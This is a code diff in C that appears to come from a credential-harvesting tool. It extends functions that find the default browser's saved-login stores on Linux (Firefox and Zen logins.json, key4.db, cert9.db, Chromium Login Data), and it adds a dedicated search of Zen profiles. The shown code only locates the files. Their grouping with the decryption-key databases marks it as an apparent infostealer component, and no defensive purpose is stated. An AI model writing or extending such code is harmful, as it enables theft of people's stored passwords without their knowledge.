@@ -25,8 +25,8 @@ const char* get_config_directory(const char* desktop_entry) {
     return NULL;
 }
 
-//  Firefox-style profile => logins.json and key4.db
-int get_firefox_credentials(char* logins_path, char* key_db_path) {
+//  Firefox-style profile => logins.json ,key4.db and cert9.db
+int get_firefox_credentials(char* logins_path, char* key_db_path, char* cert9_db_path) {
     const char *home = getenv("HOME");
     if (!home) return 0;
 
@@ -41,6 +41,7 @@ int get_firefox_credentials(char* logins_path, char* key_db_path) {
         if (dir->d_type == DT_DIR && strstr(dir->d_name, ".default")) {
             snprintf(logins_path, MAX_PATH, "%s/%s/logins.json", base, dir->d_name);
             snprintf(key_db_path, MAX_PATH, "%s/%s/key4.db", base, dir->d_name);
+            snprintf(cert9_db_path, MAX_PATH, "%s/%s/cert9.db", base, dir->d_name);
             closedir(d);
             return 1;
         }
@@ -49,6 +50,53 @@ int get_firefox_credentials(char* logins_path, char* key_db_path) {
     closedir(d);
     return 0;
 }
+
+//  zen profile => logins.json ,key4.db and cert9.db
+
+int file_exists(const char *path) {
+    struct stat st;
+    return (stat(path, &st) == 0);
+}
+
+int get_zen_credentials(char* logins_path, char* key_db_path, char* cert9_db_path) {
+    const char *home = getenv("HOME");
+    if (!home) return 0;
+
+    char base[MAX_PATH];
+    snprintf(base, sizeof(base), "%s/.zen", home);
+
+    DIR *d = opendir(base);
+    if (!d) return 0;
+
+    struct dirent *dir;
+
+    while ((dir = readdir(d))) {
+        if (dir->d_type == DT_DIR) {
+            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;
+
+            char profile_dir[MAX_PATH];
+            snprintf(profile_dir, sizeof(profile_dir), "%s/%s", base, dir->d_name);
+
+            char logins[MAX_PATH], keydb[MAX_PATH], certdb[MAX_PATH];
+            snprintf(logins, sizeof(logins), "%s/logins.json", profile_dir);
+            snprintf(keydb, sizeof(keydb), "%s/key4.db", profile_dir);
+            snprintf(certdb, sizeof(certdb), "%s/cert9.db", profile_dir);
+
+            if (file_exists(logins) && file_exists(keydb) && file_exists(certdb)) {
+                strncpy(logins_path, logins, MAX_PATH);
+                strncpy(key_db_path, keydb, MAX_PATH);
+                strncpy(cert9_db_path, certdb, MAX_PATH);
+                closedir(d);
+                return 1;
+            }
+        }
+    }
+
+    closedir(d);
+    return 0;
+}
+
+
 
 
 // Chromium-based browsers
@@ -65,7 +113,7 @@ int get_chromium_credentials(const char *config_dir, char* login_data, char* loc
     return 1;
 }
 
-int detect_credentials(char* output_path1, char* output_path2) {
+int detect_credentials(char* output_path1, char* output_path2, char* output_path3) {
     FILE *fp;
     char desktop_entry[256] = {0};
 
@@ -84,8 +132,12 @@ int detect_credentials(char* output_path1, char* output_path2) {
     const char *config_subpath = get_config_directory(desktop_entry);
     if (!config_subpath) return 0;
 
-    if (strstr(config_subpath, "mozilla") || strstr(config_subpath, ".zen")) {
-        return get_firefox_credentials(output_path1, output_path2);
+    if (strstr(config_subpath, "mozilla")) {
+        return get_firefox_credentials(output_path1, output_path2, output_path3);
+    }
+    else if (strstr(config_subpath, ".zen")){
+        return get_zen_credentials(output_path1, output_path2, output_path3);
+
     } else {
         return get_chromium_credentials(config_subpath, output_path1, output_path2);
     }
